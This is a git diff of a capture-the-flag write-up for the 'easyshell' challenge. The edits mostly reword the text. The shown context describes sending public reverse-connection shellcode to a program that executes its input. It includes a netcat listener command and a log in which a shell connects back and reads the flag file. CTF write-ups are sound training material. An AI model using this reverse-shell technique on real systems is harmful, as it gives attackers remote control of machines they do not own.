@@ -11,7 +11,7 @@
 > [easyshell.zip](easyshell.zip)
 
 ## Solution
-Upon examining the source code of the easyshell program it becomes clear that whatever is sent to the program will be read into a buffer and executed using the asm() C/C++ function used to embed and execute assembler instructions.
+Upon examining the source code of the easyshell program it becomes clear that whatever is sent to the program will be read into a buffer and executed using the `asm()` C/C++ function used to embed and execute assembler instructions.
 
 ```
 int main(int argc, char *argv[])
@@ -38,7 +38,7 @@ int main(int argc, char *argv[])
 }
 ```
 
-After experimenting with different kinds of shellcode I decided that a reverse connection was the appropriate approach so I wrote a small python script to send the shellcode. (Shellcode taken from: http://shell-storm.org/shellcode/files/shellcode-833.php)
+After experimenting with different kinds of shellcode I decided that a reverse connection was the appropriate approach. I did some googling around and found [this shell code](http://shell-storm.org/shellcode/files/shellcode-833.php), and then wrote a small python script to send it.
 
 ```
 #!/usr/bin/env python
@@ -69,7 +69,9 @@ except socket.error, e:
 ```
 
 I ran a netcat listener and upon receiving a connection it succesfully spawned a shell and the flag could be read.
+
 ```
+$ nc -vl 0.0.0.0 5555
 Listening on [0.0.0.0] (family 0, port 55555)
 Connection from [104.196.247.127] port 55555 [tcp/*] accepted (family 2, sport 33950)
 cat /home/ctf/flag.txt
